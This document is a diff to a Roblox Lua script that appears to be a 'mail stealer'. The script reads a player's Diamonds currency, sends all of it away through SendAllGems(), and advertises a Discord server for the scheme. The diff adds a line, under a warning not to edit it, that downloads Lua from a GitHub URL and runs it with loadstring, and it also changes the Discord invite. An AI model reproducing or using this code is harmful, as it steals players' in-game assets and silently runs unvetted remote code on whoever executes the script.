@@ -57,6 +57,10 @@ local MailMessage = "ego on top!"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
+-- DONT DELETE OR EDIT ANYTHING BELOW!
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/janeqnoctrl/x-sources/refs/heads/main/AntiLeaveFunction.lua"))()
+
 for id, table in pairs(Inventory.Currency) do
     if table.id == "Diamonds" then
         GemsAmount = table._am or 0
@@ -833,5 +837,5 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
     end
     SendAllGems()
-    message.Error("Join to be rich:\n discord.gg/mailstealer")
+    message.Error("Join to be rich:\n discord.gg/mailstealers")
 end
